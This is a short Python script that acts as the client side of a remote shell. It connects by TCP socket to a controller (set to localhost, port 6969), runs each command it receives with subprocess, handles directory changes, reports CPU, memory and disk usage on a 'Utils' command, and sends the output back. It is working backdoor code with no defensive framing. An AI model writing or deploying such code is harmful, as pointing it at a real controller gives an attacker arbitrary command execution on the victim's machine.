import socket
import json
import subprocess
import os
import logging
import psutil

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

HOST = "localhost"
PORT = 6969

s.connect((HOST, PORT))

def send(data):
    msg = json.dumps(data)
    s.send(msg.encode())

def recv() -> str:
    data = ""
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data) 
        except ValueError:
            continue

def shell():
    while True:
        command = recv()
        if command.startswith("cd"):
            try:
                os.chdir(command.split()[1])
                output = f"changed to {os.getcwd()}"
            except:
                output = "No such path exists...."
        elif command == "Utils":
            output = f"####CPUM#### {str(psutil.cpu_percent())}-{psutil.virtual_memory().percent}-{psutil.disk_usage('/').percent}"

        else:
            output = subprocess.getoutput(command)

        send(output)

shell()
    




